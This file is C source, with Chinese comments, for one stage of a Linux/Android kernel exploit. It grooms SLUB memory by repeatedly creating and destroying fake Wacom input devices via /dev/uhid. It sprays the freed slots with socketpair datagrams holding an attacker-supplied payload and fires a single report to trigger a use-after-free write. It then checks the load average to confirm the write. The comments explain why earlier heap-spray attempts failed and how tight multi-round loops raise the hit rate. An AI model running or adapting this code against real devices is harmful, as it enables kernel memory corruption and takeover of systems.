/*
 * phase_b4: 99491 写原语 —— 多轮紧凑循环版（每轮 free 落在 current slab）
 *
 * 为什么需要这个版本（证据见 ROOTCAUSE_SLUB_PAGE_LOCALITY.md）:
 *   phase_b3 只做【一轮】create→destroy→spray：
 *     - input_dev 是 kworker 早先创建的，其 slab page 早已不是 cpu0 current slab
 *     - free 回去的对象挂在那个旧 page 的 freelist 上
 *     - 400 次 spray 只消耗约 25 页，命中那 1 页概率 ≈3%，实测 0 命中
 *
 *   阶段 A（place_test，10 轮 × 400 对）报 92.7% 占位，因为它是【紧凑多轮】：
 *     每轮 create 会让新页成为 current slab，destroy 就 free 在 current slab 上，
 *     紧接着 spray 立刻取到它（与 L3 的 80% 同机制）。
 *
 * 所以本程序：多轮循环，每轮 create→destroy→spray，
 * 但【只在一轮】发 MUTE（避免多次 UAF 触发把状态搞乱）。
 *
 * 安全设计:
 *   1. 单次 MUTE，仅在指定 round 触发
 *   2. payload 可 guard（0x598=0xFF，绝不写），用于先验证程序流程
 *   3. oracle = avenrun[2]，严格阈值判据（沿用 phase_b3 的修正）
 *
 * 用法: phase_b4 <cpu> <rounds> <pairs> <payload_file> [mute_round] [oracle_addr]
 *   mute_round 默认 = rounds-1（最后一轮，此时已完成多轮 hot 化）
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "phasetest/33"

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_input(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms) {
    long dl = now_us() / 1000 + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_us() / 1000 < dl) {
        if (read(fd, &ev, sizeof(ev)) <= 0) usleep(300);
    }
    fcntl(fd, F_SETFL, fc);
}

static double read_av15(void) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) return -1.0;
    char l1[32] = {0}, l5[32] = {0}, l15[32] = {0};
    int got = fscanf(f, "%31s %31s %31s", l1, l5, l15);
    fclose(f);
    if (got != 3) return -1.0;
    return atof(l15);
}

int main(int argc, char **argv) {
    int cpu    = argc > 1 ? atoi(argv[1]) : 0;
    int rounds = argc > 2 ? atoi(argv[2]) : 10;
    int pairs  = argc > 3 ? atoi(argv[3]) : 400;
    const char *pfile = argc > 4 ? argv[4] : "/data/local/tmp/payload_av.bin";
    int mute_round = argc > 5 ? atoi(argv[5]) : rounds - 1;

    FILE *pf = fopen(pfile, "rb");
    if (!pf) { perror("payload"); return 2; }
    static unsigned char pl[4096];
    size_t pl_len = fread(pl, 1, sizeof(pl), pf);
    fclose(pf);

    unsigned long long ev0  = *(unsigned long long *)(pl + 0x028);
    unsigned long long abs0 = *(unsigned long long *)(pl + 0x098);
    unsigned long long p140 = *(unsigned long long *)(pl + 0x140);
    unsigned long long p148 = *(unsigned long long *)(pl + 0x148);
    unsigned int maxv = *(unsigned int *)(pl + 0x56c);
    unsigned long long vals = *(unsigned long long *)(pl + 0x570);
    unsigned char guard = pl[0x598];

    int will_write = (!guard && vals != 0 && (ev0 >> 3 & 1) && (abs0 & 1)
                      && p140 == 0 && p148 == 0);

    printf("=== phase_b4 (MULTI-ROUND, one MUTE) ===\n");
    printf("pid=%d cpu=%d rounds=%d pairs=%d mute_round=%d\n",
           getpid(), cpu, rounds, pairs, mute_round);
    printf("payload=%s len=%zu\n", pfile, pl_len);
    printf("  0x028 evbit bit3 = %d %s\n", (int)((ev0 >> 3) & 1),
           ((ev0 >> 3) & 1) ? "OK" : "!! 不触发");
    printf("  0x098 absbit bit0 = %d %s\n", (int)(abs0 & 1),
           (abs0 & 1) ? "OK" : "!! 跳过写入");
    printf("  0x140=0x%llx 0x148=0x%llx %s\n", p140, p148,
           (p140 == 0 && p148 == 0) ? "OK" : "!! 必须为0");
    printf("  0x56c max_vals = %u\n", maxv);
    printf("  0x570 vals     = 0x%016llx\n", vals);
    printf("  0x598 guard    = 0x%02x\n", guard);
    printf("  >>> 本项目应当写入: %s\n", will_write ? "YES" : "NO");
    fflush(stdout);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        printf("pin fail: %s\n", strerror(errno));
        return 3;
    }
    printf("pinned cpu=%d running=%d\n", cpu, sched_getcpu());

    double pre = read_av15();
    printf("BASELINE loadavg15 = %.2f\n", pre);
    fflush(stdout);

    /* 预建 socketpair（每轮复用） */
    int (*sp)[2] = calloc(pairs, sizeof(int[2]));
    int made = 0;
    for (int i = 0; i < pairs; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp[i]) < 0) continue;
        int sb = 8 << 20;
        setsockopt(sp[i][0], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        setsockopt(sp[i][1], SOL_SOCKET, SO_RCVBUF, &sb, sizeof(sb));
        made++;
    }
    printf("socketpairs=%d\n", made);

    int fdp = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fdp < 0) { printf("uhid open fail\n"); return 4; }
    if (uhid_create(fdp, "pb4-pad", PHYS_COMMON, 0x1102,
                    rdesc_pad, sizeof(rdesc_pad)) < 0) { printf("cp fail\n"); return 5; }
    pump(fdp, 100);
    usleep(200000);
    pump(fdp, 30);
    printf("pad created\n");
    fflush(stdout);

    int total_sent = 0;
    for (int r = 0; r < rounds; r++) {
        /* 每轮：新建 touch → destroy → 立刻 spray */
        int fdt = open("/dev/uhid", O_RDWR | O_CLOEXEC);
        if (fdt < 0) { printf("round %d: uhid open fail\n", r); break; }

        char nm[32];
        snprintf(nm, sizeof(nm), "pb4-t%02d", r);
        if (uhid_create(fdt, nm, PHYS_COMMON, 0x1100 + r,
                        rdesc_touch, sizeof(rdesc_touch)) < 0) {
            printf("round %d: create fail\n", r);
            close(fdt);
            break;
        }
        pump(fdt, 40);
        usleep(20000);
        pump(fdt, 10);

        long t1 = now_us();
        uhid_destroy(fdt);
        close(fdt);

        /* 立刻 spray（在同一个 current slab 上抢刚释放的槽位） */
        int sent = 0;
        for (int i = 0; i < made; i++) {
            if (send(sp[i][0], pl, pl_len, MSG_DONTWAIT) >= 0) sent++;
        }
        long t2 = now_us();
        total_sent += sent;

        int is_mute = (r == mute_round);
        printf("round %2d: sent=%d  free+spray=%ldus%s\n",
               r, sent, t2 - t1, is_mute ? "  <<< 本轮发 MUTE" : "");
        fflush(stdout);

        if (is_mute) {
            char c1[32];
            snprintf(c1, sizeof(c1), "%.2f", read_av15());
            printf("PRE-MUTE loadavg15 = %s\n", c1);
            printf(">>> firing MUTE (once)\n");
            fflush(stdout);
            long t3 = now_us();
            unsigned char rep[2] = { 0x02, 0x02 };
            uhid_input(fdp, rep, sizeof(rep));
            pump(fdp, 50);
            long t4 = now_us();
            printf("<<< MUTE returned in %ldus (no panic)\n", t4 - t3);
            fflush(stdout);

            double a[5];
            for (int i = 0; i < 5; i++) {
                a[i] = read_av15();
                if (i < 4) usleep(250000);
            }
            printf("POST-MUTE loadavg15 = %.2f %.2f %.2f %.2f %.2f\n",
                   a[0], a[1], a[2], a[3], a[4]);

            int zero_cnt = 0, huge_cnt = 0;
            for (int i = 0; i < 5; i++) {
                if (a[i] >= 0.0 && a[i] < 0.005) zero_cnt++;
                if (a[i] > 1000.0) huge_cnt++;
            }
            double delta = a[0] - pre;
            if (delta < 0) delta = -delta;

            printf("\n========================================\n");
            printf("pre=%.2f post0=%.2f |delta|=%.2f zero=%d huge=%d\n",
                   pre, a[0], delta, zero_cnt, huge_cnt);
            if (!will_write) {
                if (huge_cnt == 0 && zero_cnt == 0 && delta < 1.0)
                    printf("VERDICT: NEGATIVE CONTROL OK\n");
                else
                    printf("VERDICT: CONTROL ANOMALY\n");
            } else {
                if (huge_cnt > 0 || zero_cnt >= 3)
                    printf("VERDICT: WRITE CONFIRMED (PASS)\n");
                else if (delta < 1.0)
                    printf("VERDICT: NO WRITE\n");
                else
                    printf("VERDICT: WEAK SIGNAL\n");
            }
            printf("========================================\n");
            fflush(stdout);
        }

        /* 清空已发送的 skb，避免下一轮 send 被阻塞 */
        char tmp[4096];
        for (int i = 0; i < made; i++)
            while (recv(sp[i][1], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) ;
    }

    printf("total spray sent = %d\n", total_sent);

    if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }
    printf("=== phase_b4 done, SURVIVED, pid=%d ===\n", getpid());
    fflush(stdout);
    return 0;
}